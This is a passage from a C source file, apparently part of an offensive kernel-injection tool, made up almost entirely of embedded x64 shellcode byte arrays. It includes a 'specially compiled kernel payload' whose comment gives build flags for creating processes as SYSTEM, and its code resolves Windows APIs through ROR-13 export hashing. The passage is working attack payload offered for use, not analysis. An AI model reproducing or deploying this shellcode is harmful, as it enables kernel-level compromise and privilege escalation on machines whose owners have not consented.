		0x20, 0x49, 0x8b, 0x73, 0x30, 0x49, 0x8b, 0xe3, 0x41, 0x5e, 0x5f, 0x5d,
		0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08, 0x48,
		0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x55, 0x48, 0x8d, 0x68, 0xa1,
		0x48, 0x81, 0xec, 0xb0, 0x00, 0x00, 0x00, 0x48, 0x83, 0x65, 0x6f, 0x00,
		0x48, 0x8d, 0x4d, 0x27, 0x48, 0x8b, 0xf2, 0xbf, 0x30, 0x00, 0x00, 0x00,
		0x8b, 0xd7, 0x49, 0x8b, 0xd8, 0xff, 0x96, 0x80, 0x00, 0x00, 0x00, 0x8d,
		0x57, 0xe0, 0x48, 0x8d, 0x4d, 0x07, 0xff, 0x96, 0x80, 0x00, 0x00, 0x00,
		0x48, 0x8d, 0x93, 0x1c, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x4d, 0x17, 0xff,
		0x56, 0x78, 0x48, 0x8b, 0x4b, 0x10, 0x48, 0x8d, 0x45, 0x17, 0x48, 0x83,
		0x65, 0x2f, 0x00, 0x0f, 0x57, 0xc0, 0x48, 0x89, 0x45, 0x37, 0x8a, 0xc1,
		0x24, 0x80, 0x48, 0x89, 0x7d, 0x27, 0xf6, 0xd8, 0x48, 0xc7, 0x45, 0x3f,
		0x40, 0x02, 0x00, 0x00, 0xf3, 0x0f, 0x7f, 0x45, 0x47, 0x1b, 0xd2, 0x81,
		0xe2, 0x04, 0x00, 0x00, 0xc0, 0x81, 0xc2, 0x00, 0x00, 0x00, 0x40, 0xf6,
		0xc1, 0x40, 0x74, 0x0d, 0x48, 0x83, 0xbb, 0x28, 0x03, 0x00, 0x00, 0x00,
		0x8d, 0x47, 0xd5, 0x74, 0x05, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x83, 0x64,
		0x24, 0x50, 0x00, 0x4c, 0x8d, 0x4d, 0x07, 0x48, 0x83, 0x64, 0x24, 0x48,
		0x00, 0x4c, 0x8d, 0x45, 0x27, 0xc7, 0x44, 0x24, 0x40, 0x20, 0x00, 0x00,
		0x00, 0x48, 0x8d, 0x4d, 0x6f, 0x89, 0x44, 0x24, 0x38, 0x83, 0x64, 0x24,
		0x30, 0x00, 0xc7, 0x44, 0x24, 0x28, 0x80, 0x00, 0x00, 0x00, 0x48, 0x83,
		0x64, 0x24, 0x20, 0x00, 0xff, 0x96, 0x90, 0x00, 0x00, 0x00, 0x8b, 0xf8,
		0x85, 0xc0, 0x75, 0x45, 0x48, 0x83, 0x64, 0x24, 0x40, 0x00, 0x48, 0x8d,
		0x83, 0x28, 0x03, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8d,
		0x8b, 0x38, 0x03, 0x00, 0x00, 0x8b, 0x83, 0x30, 0x03, 0x00, 0x00, 0x45,
		0x33, 0xc9, 0x89, 0x44, 0x24, 0x30, 0x45, 0x33, 0xc0, 0x48, 0x89, 0x4c,
		0x24, 0x28, 0x48, 0x8d, 0x45, 0x07, 0x48, 0x8b, 0x4d, 0x6f, 0x33, 0xd2,
		0x48, 0x89, 0x44, 0x24, 0x20, 0xff, 0x96, 0xc0, 0x00, 0x00, 0x00, 0x8b,
		0xf8, 0x48, 0x8b, 0x4d, 0x6f, 0x48, 0x85, 0xc9, 0x74, 0x06, 0xff, 0x96,
		0x88, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x9c, 0x24, 0xb0, 0x00, 0x00, 0x00,
		0x8b, 0xc7, 0x49, 0x8b, 0x5b, 0x10, 0x49, 0x8b, 0x73, 0x20, 0x49, 0x8b,
		0x7b, 0x28, 0x49, 0x8b, 0xe3, 0x5d, 0xc3, 0xcc, 0x40, 0x53, 0x48, 0x81,
		0xec, 0xf0, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xd9, 0x48, 0x8d, 0x54, 0x24,
		0x20, 0x48, 0x8b, 0x49, 0x08, 0xe8, 0xba, 0x00, 0x00, 0x00, 0x4c, 0x8b,
		0x83, 0x08, 0x01, 0x00, 0x00, 0x4c, 0x03, 0x43, 0x28, 0x48, 0x81, 0xbb,
		0x00, 0x01, 0x00, 0x00, 0x38, 0x03, 0x00, 0x00, 0x0f, 0x82, 0x86, 0x00,
		0x00, 0x00, 0x48, 0xb8, 0x0f, 0x13, 0xaa, 0x93, 0xad, 0x20, 0xe7, 0x79,
		0x49, 0x39, 0x00, 0x75, 0x77, 0x49, 0x8b, 0x40, 0x08, 0x48, 0x83, 0xf8,
		0x01, 0x75, 0x19, 0x48, 0x8d, 0x54, 0x24, 0x20, 0x48, 0x8b, 0xcb, 0xe8,
		0xc0, 0xfa, 0xff, 0xff, 0x48, 0x63, 0xc8, 0x48, 0x89, 0x8b, 0x20, 0x02,
		0x00, 0x00, 0xeb, 0x60, 0x48, 0x83, 0xf8, 0x03, 0x75, 0x0f, 0x48, 0x8d,
		0x54, 0x24, 0x20, 0x48, 0x8b, 0xcb, 0xe8, 0xe9, 0xfc, 0xff, 0xff, 0xeb,
		0xdf, 0x48, 0x83, 0xf8, 0x02, 0x75, 0x0f, 0x48, 0x8d, 0x54, 0x24, 0x20,
		0x48, 0x8b, 0xcb, 0xe8, 0x1c, 0xfe, 0xff, 0xff, 0xeb, 0xca, 0x48, 0x83,
		0xf8, 0x04, 0x75, 0x0f, 0x48, 0x8d, 0x54, 0x24, 0x20, 0x48, 0x8b, 0xcb,
		0xe8, 0xb3, 0xf8, 0xff, 0xff, 0xeb, 0xb5, 0x48, 0x83, 0xf8, 0x05, 0x75,
		0x1b, 0x48, 0x8d, 0x54, 0x24, 0x20, 0x48, 0x8b, 0xcb, 0xe8, 0x7e, 0xf9,
		0xff, 0xff, 0xeb, 0xa0, 0xb8, 0x01, 0x00, 0x00, 0xc0, 0x48, 0x89, 0x83,
		0x20, 0x02, 0x00, 0x00, 0x48, 0x81, 0xc4, 0xf0, 0x00, 0x00, 0x00, 0x5b,
		0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08, 0x48,
		0x89, 0x70, 0x10, 0x48, 0x89, 0x78, 0x18, 0x4c, 0x89, 0x70, 0x20, 0x55,
		0x48, 0x8d, 0x68, 0xa1, 0x48, 0x81, 0xec, 0x90, 0x00, 0x00, 0x00, 0x4c,
		0x8b, 0xf1, 0xc7, 0x45, 0xe7, 0x4a, 0x45, 0x3b, 0xd7, 0xc7, 0x45, 0xeb,
		0x62, 0xe0, 0x07, 0x37, 0x48, 0x8d, 0xba, 0xc8, 0x00, 0x00, 0x00, 0xc7,
		0x45, 0xef, 0x1f, 0x9d, 0x48, 0x9d, 0x48, 0x8d, 0x75, 0x4b, 0xc7, 0x45,
		0xf3, 0xa1, 0x7b, 0xcc, 0xdc, 0xbb, 0x19, 0x00, 0x00, 0x00, 0xc7, 0x45,
		0xf7, 0x92, 0x6d, 0x58, 0x58, 0xc7, 0x45, 0xfb, 0xce, 0xad, 0x90, 0x4d,
		0xc7, 0x45, 0xff, 0x57, 0x63, 0x32, 0x5a, 0xc7, 0x45, 0x03, 0x8f, 0xb5,
		0x6a, 0x6a, 0xc7, 0x45, 0x07, 0xf9, 0xbe, 0xdd, 0x05, 0xc7, 0x45, 0x0b,
		0xf7, 0x38, 0xb3, 0x9d, 0xc7, 0x45, 0x0f, 0xc9, 0xc5, 0x6e, 0x6c, 0xc7,
		0x45, 0x13, 0x89, 0x83, 0x6c, 0xeb, 0xc7, 0x45, 0x17, 0x9b, 0x97, 0x64,
		0xcf, 0xc7, 0x45, 0x1b, 0x2a, 0xc0, 0xb2, 0xa8, 0xc7, 0x45, 0x1f, 0x3d,
		0x28, 0xc3, 0x7c, 0xc7, 0x45, 0x23, 0x2a, 0xd0, 0x35, 0x30, 0xc7, 0x45,
		0x27, 0xdb, 0x4f, 0x3d, 0xc5, 0xc7, 0x45, 0x2b, 0x61, 0x4c, 0x04, 0x5d,
		0xc7, 0x45, 0x2f, 0x9d, 0x8f, 0xa0, 0xc3, 0xc7, 0x45, 0x33, 0xb8, 0xd4,
		0x29, 0x88, 0xc7, 0x45, 0x37, 0x50, 0x64, 0xb0, 0x6f, 0xc7, 0x45, 0x3b,
		0xe2, 0xca, 0x61, 0xe6, 0xc7, 0x45, 0x3f, 0xde, 0x24, 0xe6, 0xf7, 0xc7,
		0x45, 0x43, 0x16, 0x35, 0xfd, 0x87, 0xc7, 0x45, 0x47, 0x36, 0x31, 0x0e,
		0x68, 0x48, 0x8d, 0x76, 0xfc, 0x49, 0x8b, 0xce, 0x8b, 0x16, 0x48, 0x8d,
		0x7f, 0xf8, 0xe8, 0x25, 0x00, 0x00, 0x00, 0x48, 0x89, 0x07, 0x83, 0xc3,
		0xff, 0x75, 0xe6, 0x4c, 0x8d, 0x9c, 0x24, 0x90, 0x00, 0x00, 0x00, 0x49,
		0x8b, 0x5b, 0x10, 0x49, 0x8b, 0x73, 0x18, 0x49, 0x8b, 0x7b, 0x20, 0x4d,
		0x8b, 0x73, 0x28, 0x49, 0x8b, 0xe3, 0x5d, 0xc3, 0x48, 0x8b, 0xc4, 0x48,
		0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48,
		0x89, 0x78, 0x20, 0x8b, 0xea, 0x48, 0x85, 0xc9, 0x74, 0x7a, 0xb8, 0x4d,
		0x5a, 0x00, 0x00, 0x66, 0x39, 0x01, 0x75, 0x70, 0x48, 0x63, 0x41, 0x3c,
		0x48, 0x03, 0xc1, 0x74, 0x67, 0x81, 0x38, 0x50, 0x45, 0x00, 0x00, 0x75,
		0x5f, 0x8b, 0x90, 0x88, 0x00, 0x00, 0x00, 0x48, 0x03, 0xd1, 0x74, 0x54,
		0x44, 0x8b, 0x5a, 0x18, 0x45, 0x85, 0xdb, 0x74, 0x4b, 0x8b, 0x42, 0x20,
		0x85, 0xc0, 0x74, 0x44, 0x8b, 0x72, 0x24, 0x4c, 0x8d, 0x0c, 0x01, 0x8b,
		0x7a, 0x1c, 0x48, 0x03, 0xf1, 0x48, 0x03, 0xf9, 0x45, 0x33, 0xc0, 0x45,
		0x85, 0xdb, 0x74, 0x2c, 0x45, 0x8b, 0x11, 0x4c, 0x03, 0xd1, 0x33, 0xdb,
		0xeb, 0x0b, 0x0f, 0xb6, 0xc0, 0x49, 0xff, 0xc2, 0xc1, 0xcb, 0x0d, 0x03,
		0xd8, 0x41, 0x8a, 0x02, 0x84, 0xc0, 0x75, 0xee, 0x3b, 0xdd, 0x74, 0x23,
		0x41, 0xff, 0xc0, 0x49, 0x83, 0xc1, 0x04, 0x45, 0x3b, 0xc3, 0x72, 0xd4,
		0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x08, 0x48, 0x8b, 0x6c, 0x24, 0x10,
		0x48, 0x8b, 0x74, 0x24, 0x18, 0x48, 0x8b, 0x7c, 0x24, 0x20, 0xc3, 0x46,
		0x0f, 0xb7, 0x04, 0x46, 0x44, 0x3b, 0x42, 0x14, 0x73, 0xde, 0x42, 0x8b,
		0x04, 0x87, 0x48, 0x03, 0xc1, 0xeb, 0xd7
	};
	*ppb = WINX64_VFS_BIN;
	*pcb = sizeof(WINX64_VFS_BIN);
}

// specially compiled kernel payload, compile and extract shellcode with:
//
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel /D_PSCMD /D_PSCMD_SYSTEM /D_EXEC_USER_EXTERNAL wx64_pscreate.c
// ml64 wx64_common_a.asm /Fewx64_pscmd.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_pscreate.obj wx64_common.obj
// shellcode64.exe -o wx64_pscmd.exe
// xxd -i wx64_pscmd.bin
VOID GetData_PSCMD_KERNEL(PBYTE *ppb, PDWORD pcb)
{
	BYTE WINX64_PSCMD_KERNEL_BIN[] = {
		0x56, 0x48, 0x8b, 0xf4, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x20,
		0xe8, 0x7b, 0x06, 0x00, 0x00, 0x48, 0x8b, 0xe6, 0x5e, 0xc3, 0x0f, 0x20,
		0xd8, 0xc3, 0x0f, 0x09, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x55, 0x53, 0x56,
		0x57, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0x6c, 0x24, 0xd9,
		0x48, 0x81, 0xec, 0xe0, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0xb9, 0x20, 0x01,
		0x00, 0x00, 0x48, 0x8b, 0xf2, 0x48, 0x83, 0x65, 0x7f, 0x00, 0x48, 0x8d,
		0x55, 0x7f, 0x48, 0x83, 0x65, 0x77, 0x00, 0x48, 0x8b, 0xd9, 0x45, 0x33,
		0xf6, 0x48, 0xc7, 0x45, 0x97, 0x00, 0x10, 0x00, 0x00, 0x4c, 0x21, 0x75,
		0x67, 0x49, 0x8b, 0xcf, 0x49, 0x8b, 0xf8, 0x41, 0xff, 0x50, 0x58, 0x48,
		0x63, 0xc8, 0x41, 0xbd, 0x00, 0x00, 0x00, 0xc0, 0x8b, 0xc1, 0x41, 0x23,
		0xc5, 0x41, 0x3b, 0xc5, 0x75, 0x17, 0x48, 0x89, 0x8b, 0x20, 0x02, 0x00,
		0x00, 0x48, 0xc7, 0x83, 0x28, 0x02, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
		0xe9, 0xc1, 0x01, 0x00, 0x00, 0xba, 0x30, 0x00, 0x00, 0x00, 0x48, 0x8d,
		0x4d, 0xf7, 0xff, 0x96, 0x80, 0x00, 0x00, 0x00, 0xba, 0x10, 0x00, 0x00,
		0x00, 0x48, 0x8d, 0x4d, 0x9f, 0xff, 0x96, 0x80, 0x00, 0x00, 0x00, 0x4c,
		0x21, 0x75, 0xa7, 0x4c, 0x8d, 0x4d, 0x9f, 0x4c, 0x8d, 0x45, 0xf7, 0x4c,
		0x89, 0x7d, 0x9f, 0xba, 0xff, 0xff, 0x1f, 0x00, 0x48, 0x8d, 0x4d, 0x67,
		0xff, 0x97, 0x80, 0x00, 0x00, 0x00, 0x48, 0x63, 0xc8, 0x8b, 0xc1, 0x41,
		0x23, 0xc5, 0x41, 0x3b, 0xc5, 0x75, 0x17, 0x48, 0x89, 0x8b, 0x20, 0x02,
		0x00, 0x00, 0x48, 0xc7, 0x83, 0x28, 0x02, 0x00, 0x00, 0x04, 0x00, 0x00,
		0x00, 0xe9, 0x45, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x4d, 0x67, 0x4c, 0x8d,
		0x4d, 0x97, 0xc7, 0x44, 0x24, 0x28, 0x40, 0x00, 0x00, 0x00, 0x48, 0x8d,
		0x55, 0x77, 0x41, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xc7, 0x44, 0x24, 0x20,
		0x00, 0x30, 0x00, 0x00, 0xff, 0x57, 0x78, 0x48, 0x63, 0xc8, 0x8b, 0xc1,
		0x41, 0x23, 0xc5, 0x41, 0x3b, 0xc5, 0x75, 0x17, 0x48, 0x89, 0x8b, 0x20,
		0x02, 0x00, 0x00, 0x48, 0xc7, 0x83, 0x28, 0x02, 0x00, 0x00, 0x05, 0x00,
		0x00, 0x00, 0xe9, 0xfc, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x4d, 0x7f, 0x48,
		0x8d, 0x55, 0xb7, 0xff, 0x57, 0x18, 0x4c, 0x39, 0xb3, 0x30, 0x01, 0x00,
		0x00, 0x74, 0x38, 0x4c, 0x8b, 0xc7, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcb,
		0xe8, 0x3f, 0x04, 0x00, 0x00, 0x4c, 0x8b, 0xf0, 0x48, 0x85, 0xc0, 0x75,
		0x22, 0x48, 0xc7, 0x83, 0x20, 0x02, 0x00, 0x00, 0x05, 0x40, 0x00, 0x80,
		0x48, 0x8d, 0x4d, 0xb7, 0x48, 0xc7, 0x83, 0x28, 0x02, 0x00, 0x00, 0x06,
		0x00, 0x00, 0x00, 0xff, 0x57, 0x20, 0xe9, 0xb0, 0x00, 0x00, 0x00, 0x4c,
		0x8b, 0x4d, 0x77, 0x4c, 0x8b, 0xc7, 0x48, 0x8b, 0xd6, 0x4c, 0x89, 0x74,
		0x24, 0x20, 0x48, 0x8b, 0xcb, 0xe8, 0x16, 0x03, 0x00, 0x00, 0x8b, 0xc8,
		0x41, 0x23, 0xcd, 0x41, 0x3b, 0xcd, 0x48, 0x8d, 0x4d, 0xb7, 0x75, 0x16,
		0x48, 0x98, 0x48, 0x89, 0x83, 0x20, 0x02, 0x00, 0x00, 0x48, 0xc7, 0x83,
		0x28, 0x02, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0xeb, 0xbd, 0xff, 0x57,
		0x20, 0x4c, 0x8b, 0x57, 0x68, 0x4d, 0x85, 0xd2, 0x74, 0x69, 0x48, 0x8b,
		0x4d, 0x67, 0x48, 0x8d, 0x45, 0xe7, 0x48, 0x89, 0x44, 0x24, 0x48, 0x45,
		0x33, 0xc9, 0x48, 0x8d, 0x45, 0xaf, 0x45, 0x33, 0xc0, 0x48, 0x89, 0x44,
		0x24, 0x40, 0x33, 0xd2, 0x48, 0x83, 0x64, 0x24, 0x38, 0x00, 0x48, 0x8b,
		0x45, 0x77, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x83, 0x64, 0x24, 0x28,
		0x00, 0x48, 0x83, 0x64, 0x24, 0x20, 0x00, 0x41, 0xff, 0xd2, 0x8b, 0xc8,
		0x41, 0x23, 0xcd, 0x41, 0x3b, 0xcd, 0x75, 0x16, 0x48, 0x98, 0x48, 0x89,
		0x83, 0x20, 0x02, 0x00, 0x00, 0x48, 0xc7, 0x83, 0x28, 0x02, 0x00, 0x00,
		0x0a, 0x00, 0x00, 0x00, 0xeb, 0x0d, 0xba, 0xfa, 0x00, 0x00, 0x00, 0x48,
		0x8b, 0xce, 0xe8, 0x61, 0x05, 0x00, 0x00, 0x48, 0x8b, 0x4d, 0x67, 0x48,
		0x85, 0xc9, 0x74, 0x06, 0xff, 0x96, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8b,
		0x4d, 0x7f, 0x48, 0x85, 0xc9, 0x74, 0x03, 0xff, 0x57, 0x48, 0x48, 0x81,
		0xc4, 0xe0, 0x00, 0x00, 0x00, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x5f,
		0x5e, 0x5b, 0x5d, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x10, 0x48, 0x89, 0x6c,
		0x24, 0x18, 0x56, 0x57, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83,
		0xec, 0x40, 0x4c, 0x8b, 0xe2, 0x48, 0x8b, 0xf1, 0x33, 0xd2, 0x4d, 0x8b,
		0xf1, 0x4d, 0x8b, 0xf8, 0x4c, 0x8d, 0x4c, 0x24, 0x70, 0x45, 0x33, 0xc0,
		0x8d, 0x5a, 0x05, 0x8b, 0xcb, 0xff, 0x96, 0xa8, 0x00, 0x00, 0x00, 0x3d,
		0x04, 0x00, 0x00, 0xc0, 0x0f, 0x85, 0xb2, 0x00, 0x00, 0x00, 0x8b, 0x4c,
		0x24, 0x70, 0x85, 0xc9, 0x0f, 0x84, 0xa6, 0x00, 0x00, 0x00, 0x8b, 0xd1,
		0x33, 0xc9, 0xff, 0x56, 0x08, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x75,
		0x0a, 0xb8, 0x0e, 0x00, 0x07, 0x80, 0xe9, 0x8d, 0x00, 0x00, 0x00, 0x44,
		0x8b, 0x44, 0x24, 0x70, 0x4c, 0x8d, 0x4c, 0x24, 0x70, 0x48, 0x8b, 0xd7,
		0x8b, 0xcb, 0xff, 0x96, 0xa8, 0x00, 0x00, 0x00, 0x8b, 0xe8, 0x85, 0xc0,
		0x78, 0x6a, 0x48, 0x8b, 0xdf, 0xba, 0x10, 0x00, 0x00, 0x00, 0x48, 0x8d,
		0x4c, 0x24, 0x30, 0xff, 0x96, 0x80, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0x43,
		0x50, 0x48, 0x8d, 0x44, 0x24, 0x30, 0x41, 0xb9, 0x10, 0x00, 0x00, 0x00,
		0x48, 0x89, 0x44, 0x24, 0x20, 0x49, 0x8b, 0xd4, 0x48, 0x8b, 0xce, 0xe8,
		0x5c, 0x00, 0x00, 0x00, 0x49, 0x8b, 0xd7, 0x48, 0x8d, 0x4c, 0x24, 0x30,
		0xff, 0x16, 0x85, 0xc0, 0x74, 0x23, 0x8b, 0x03, 0x85, 0xc0, 0x74, 0x16,
		0x48, 0x03, 0xd8, 0x48, 0x3b, 0xdf, 0x72, 0x1c, 0x8b, 0x44, 0x24, 0x70,
		0x48, 0x03, 0xc7, 0x48, 0x3b, 0xd8, 0x73, 0x10, 0xeb, 0xa7, 0xbd, 0x9f,
		0x13, 0x07, 0x80, 0xeb, 0x07, 0x48, 0x8b, 0x43, 0x50, 0x49, 0x89, 0x06,
		0x48, 0x8b, 0xcf, 0xff, 0x56, 0x10, 0x8b, 0xc5, 0x4c, 0x8d, 0x5c, 0x24,
		0x40, 0x49, 0x8b, 0x5b, 0x38, 0x49, 0x8b, 0x6b, 0x40, 0x49, 0x8b, 0xe3,
		0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5c, 0x5f, 0x5e, 0xc3, 0xcc, 0xcc, 0xcc,
		0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x6c, 0x24, 0x18, 0x56, 0x57,
		0x41, 0x56, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xf2, 0x4c, 0x8b, 0xf1,
		0x48, 0x8d, 0x54, 0x24, 0x48, 0x49, 0x8b, 0xc8, 0x49, 0x8b, 0xe9, 0xff,
		0x56, 0x58, 0x8b, 0xf8, 0x85, 0xc0, 0x78, 0x23, 0x48, 0x8b, 0x4c, 0x24,
		0x48, 0xff, 0x56, 0x50, 0x48, 0x8b, 0xc8, 0x48, 0x8b, 0xd5, 0x48, 0x8b,
		0xd8, 0xff, 0x56, 0x70, 0x48, 0x8b, 0x4c, 0x24, 0x60, 0x48, 0x8b, 0xd3,
		0x4c, 0x8b, 0xc0, 0x41, 0xff, 0x56, 0x60, 0x48, 0x8b, 0x5c, 0x24, 0x40,
		0x8b, 0xc7, 0x48, 0x8b, 0x6c, 0x24, 0x50, 0x48, 0x83, 0xc4, 0x20, 0x41,
		0x5e, 0x5f, 0x5e, 0xc3, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08, 0x48,
		0x89, 0x70, 0x10, 0x48, 0x89, 0x78, 0x18, 0x4c, 0x89, 0x70, 0x20, 0x55,
		0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x70, 0x4c, 0x8b, 0xf1, 0xc7, 0x45,
		0xb0, 0x5d, 0xc6, 0x94, 0xfb, 0xc7, 0x45, 0xb4, 0xa3, 0x8d, 0x98, 0x2b,
		0x48, 0x8d, 0xba, 0x88, 0x00, 0x00, 0x00, 0xc7, 0x45, 0xb8, 0xf9, 0x95,
		0xc6, 0x88, 0x48, 0x8d, 0x75, 0xf4, 0xc7, 0x45, 0xbc, 0xbe, 0x47, 0x00,
		0x9e, 0xbb, 0x11, 0x00, 0x00, 0x00, 0xc7, 0x45, 0xc0, 0xf4, 0xdc, 0x47,
		0xf0, 0xc7, 0x45, 0xc4, 0xbc, 0x1e, 0x36, 0x9f, 0xc7, 0x45, 0xc8, 0x92,
		0xf5, 0x45, 0x13, 0xc7, 0x45, 0xcc, 0xcd, 0x1d, 0xeb, 0xbc, 0xc7, 0x45,
		0xd0, 0x2b, 0x0e, 0xd0, 0x97, 0xc7, 0x45, 0xd4, 0xd6, 0x3f, 0x05, 0x2e,
		0xc7, 0x45, 0xd8, 0xec, 0xee, 0xe7, 0x8b, 0xc7, 0x45, 0xdc, 0x2a, 0xb8,
		0xa0, 0xa3, 0xc7, 0x45, 0xe0, 0x0d, 0x0e, 0x0b, 0x0e, 0xc7, 0x45, 0xe4,
		0x41, 0x20, 0x2f, 0x44, 0xc7, 0x45, 0xe8, 0xa8, 0x3b, 0xfb, 0xe0, 0xc7,
		0x45, 0xec, 0xed, 0x4a, 0x3d, 0xd3, 0xc7, 0x45, 0xf0, 0x60, 0x9d, 0xd0,
		0xf0, 0x48, 0x8d, 0x76, 0xfc, 0x49, 0x8b, 0xce, 0x8b, 0x16, 0x48, 0x8d,
		0x7f, 0xf8, 0xe8, 0x49, 0x04, 0x00, 0x00, 0x48, 0x89, 0x07, 0x83, 0xc3,
		0xff, 0x75, 0xe6, 0x4c, 0x8d, 0x5c, 0x24, 0x70, 0x49, 0x8b, 0x5b, 0x10,
		0x49, 0x8b, 0x73, 0x18, 0x49, 0x8b, 0x7b, 0x20, 0x4d, 0x8b, 0x73, 0x28,
		0x49, 0x8b, 0xe3, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48,
		0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48,
		0x89, 0x78, 0x20, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec,
		0x20, 0x4c, 0x8b, 0x71, 0x68, 0x4c, 0x8d, 0xa1, 0x00, 0x04, 0x00, 0x00,
		0x4c, 0x89, 0xb1, 0x80, 0x00, 0x00, 0x00, 0x41, 0x8b, 0xc6, 0x25, 0xff,
		0x0f, 0x00, 0x00, 0x41, 0xbf, 0x00, 0x10, 0x00, 0x00, 0x44, 0x2b, 0xf8,
		0x48, 0x8b, 0xfa, 0x4c, 0x89, 0xb9, 0x88, 0x00, 0x00, 0x00, 0x48, 0xb8,
		0x66, 0x66, 0x77, 0x77, 0x66, 0x66, 0x77, 0x77, 0x48, 0x89, 0x41, 0x78,
		0x48, 0x8b, 0xd9, 0x49, 0x8b, 0x06, 0xba, 0x04, 0x01, 0x00, 0x00, 0x48,
		0x89, 0x81, 0x88, 0x00, 0x00, 0x00, 0x49, 0x8b, 0xe9, 0x49, 0x8b, 0xcc,
		0x41, 0xff, 0x50, 0x70, 0x48, 0x85, 0xc0, 0x75, 0x07, 0xb8, 0x57, 0x00,
		0x07, 0x80, 0xeb, 0x47, 0xba, 0x00, 0x10, 0x00, 0x00, 0x48, 0x8b, 0xcd,
		0xff, 0x97, 0x80, 0x00, 0x00, 0x00, 0x4d, 0x8b, 0xc7, 0x49, 0x8b, 0xd6,
		0x48, 0x8b, 0xcd, 0xff, 0x57, 0x60, 0x41, 0xb8, 0x04, 0x01, 0x00, 0x00,
		0x48, 0x8d, 0x8d, 0xe8, 0x0e, 0x00, 0x00, 0x49, 0x8b, 0xd4, 0xff, 0x57,
		0x60, 0x8b, 0x83, 0x28, 0x01, 0x00, 0x00, 0x89, 0x85, 0xf8, 0x0f, 0x00,
		0x00, 0x48, 0x8b, 0x44, 0x24, 0x60, 0x48, 0x89, 0x85, 0xf0, 0x0f, 0x00,
		0x00, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x8b, 0x6c, 0x24,
		0x48, 0x48, 0x8b, 0x74, 0x24, 0x50, 0x48, 0x8b, 0x7c, 0x24, 0x58, 0x48,
		0x83, 0xc4, 0x20, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5c, 0xc3, 0xcc, 0xcc,
		0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48,
		0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xec,
		0x30, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xe9, 0x41, 0xbe, 0x00, 0x20, 0x00,
		0x00, 0x33, 0xc9, 0x41, 0x8b, 0xd6, 0x49, 0x8b, 0xf0, 0xff, 0x53, 0x08,
		0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x75, 0x07, 0x33, 0xc0, 0xe9, 0x90,
		0x00, 0x00, 0x00, 0x49, 0x8b, 0xd6, 0x48, 0x8b, 0xcf, 0xff, 0x93, 0x80,
		0x00, 0x00, 0x00, 0x48, 0x83, 0x64, 0x24, 0x20, 0x00, 0x45, 0x33, 0xc9,
		0x45, 0x33, 0xc0, 0x41, 0x8b, 0xd6, 0x48, 0x8b, 0xcf, 0xff, 0x16, 0x4c,
		0x8b, 0xf0, 0x48, 0x85, 0xc0, 0x75, 0x08, 0x48, 0x8b, 0xcf, 0xff, 0x53,
		0x10, 0xeb, 0xc9, 0x33, 0xd2, 0x49, 0x8b, 0xce, 0x44, 0x8d, 0x42, 0x02,
		0xff, 0x56, 0x40, 0x45, 0x33, 0xc9, 0xc7, 0x44, 0x24, 0x28, 0x10, 0x00,
		0x00, 0x00, 0x83, 0x64, 0x24, 0x20, 0x00, 0x49, 0x8b, 0xce, 0x45, 0x8d,
		0x41, 0x01, 0x41, 0x8a, 0xd0, 0xff, 0x56, 0x38, 0x48, 0x8b, 0xf0, 0x48,
		0x85, 0xc0, 0x74, 0xc7, 0x48, 0x8b, 0xc8, 0xff, 0x53, 0x30, 0x48, 0x8d,
		0x8e, 0x00, 0x10, 0x00, 0x00, 0x48, 0x89, 0x85, 0x18, 0x01, 0x00, 0x00,
		0xff, 0x53, 0x30, 0x48, 0x89, 0x85, 0x18, 0x02, 0x00, 0x00, 0x48, 0x8b,
